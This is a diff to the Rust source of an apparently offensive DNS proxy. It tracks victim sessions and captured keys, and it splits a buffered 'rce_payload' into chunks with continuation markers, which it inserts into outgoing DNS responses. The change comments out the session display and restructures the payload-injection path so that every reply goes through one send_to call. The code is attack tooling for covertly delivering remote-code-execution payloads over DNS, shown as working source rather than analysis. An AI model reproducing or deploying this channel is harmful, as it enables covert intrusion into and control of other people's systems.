@@ -67,14 +67,14 @@ pub async fn mangle(
             current_session.keys.extend(mapped_keys)
         }
     }
-    if !log_enabled!(Level::Debug) {
-        print!("\x1B[2J\x1B[1;1H");
+    // if !log_enabled!(Level::Debug) {
+    //     print!("\x1B[2J\x1B[1;1H");
 
-        std::io::Write::flush(&mut std::io::stdout()).unwrap();
-    }
-    for session in current_sessions.values() {
-        info!("{}\n", session);
-    }
+    //     std::io::Write::flush(&mut std::io::stdout()).unwrap();
+    // }
+    // for session in current_sessions.values() {
+    //     info!("{}\n", session);
+    // }
 
     Ok(data)
 }
@@ -202,30 +202,35 @@ impl DnsProxy {
 
             sessions_store.try_send(current_session.clone())?;
 
-            if let Some(ref mut rce_payload) = &mut current_session.rce_payload {
-                if !rce_payload.buffer.is_empty() {
-                    let is_start = rce_payload.buffer.len() == rce_payload.length;
-                    let transmitted_payload: Vec<u8> = rce_payload
-                        .buffer
-                        .drain(0..payload_max_len.min(rce_payload.length))
-                        .collect();
-                    debug!("PAYLOAD SZ={}", transmitted_payload.len());
-                    let cbyte = if transmitted_payload.len() == rce_payload.length {
-                        ContinuationByte::ResetEnd
-                    } else if rce_payload.buffer.is_empty() {
-                        ContinuationByte::End
-                    } else if is_start {
-                        ContinuationByte::Reset
+            let data = match &mut current_session.rce_payload {
+                Some(ref mut rce_payload) => {
+                    if !rce_payload.buffer.is_empty() {
+                        let is_start = rce_payload.buffer.len() == rce_payload.length;
+                        let transmitted_payload: Vec<u8> = rce_payload
+                            .buffer
+                            .drain(0..payload_max_len.min(rce_payload.length))
+                            .collect();
+                        debug!("PAYLOAD SZ={}", transmitted_payload.len());
+                        let cbyte = if transmitted_payload.len() == rce_payload.length {
+                            ContinuationByte::ResetEnd
+                        } else if rce_payload.buffer.is_empty() {
+                            ContinuationByte::End
+                        } else if is_start {
+                            ContinuationByte::Reset
+                        } else {
+                            ContinuationByte::Continue
+                        };
+                        let augmented_data =
+                            add_info(&mut data, &transmitted_payload, cbyte).await?;
+                        sessions_store.try_send(current_session.clone())?;
+                        augmented_data
                     } else {
-                        ContinuationByte::Continue
-                    };
-                    let augmented_data = add_info(&mut data, &transmitted_payload, cbyte).await?;
-                    let len = sock.send_to(&augmented_data, addr).await?;
-                    debug!("{:?} bytes sent", len);
-                    sessions_store.try_send(current_session.clone())?;
+                        data
+                    }
                 }
-            }
-        } else {
+                None => data,
+            };
+
             let len = sock.send_to(&data, addr).await?;
             debug!("{:?} bytes sent", len);
         }
